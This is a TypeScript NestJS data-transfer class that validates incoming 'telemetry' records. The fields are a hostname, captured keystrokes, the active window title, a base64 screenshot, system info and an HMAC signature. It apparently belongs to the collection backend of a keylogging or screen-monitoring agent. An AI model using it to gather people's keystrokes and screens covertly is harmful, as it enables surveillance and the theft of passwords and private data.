import { IsString, IsOptional, Matches, ValidateNested } from 'class-validator';
import { Type } from 'class-transformer';
import { SystemInfoDto } from './system-info.dto';

export class CreateTelemetryDto {
  @IsString()
  timestamp: string;

  @IsString()
  hostname: string;

  @IsOptional()
  @IsString()
  keystrokes?: string;

  @IsOptional()
  @IsString()
  active_window?: string;

  @IsOptional()
  @IsString()
  screenshot?: string; // base64

  @IsOptional()
  @ValidateNested()
  @Type(() => SystemInfoDto)
  system_info?: SystemInfoDto;

  @IsString()
  @Matches(/^[a-f0-9]{64}$/, {
    message: 'data_signature must be a valid SHA256 hash (64 hex characters)',
  })
  data_signature: string; // HMAC-SHA256 подпись payload
}
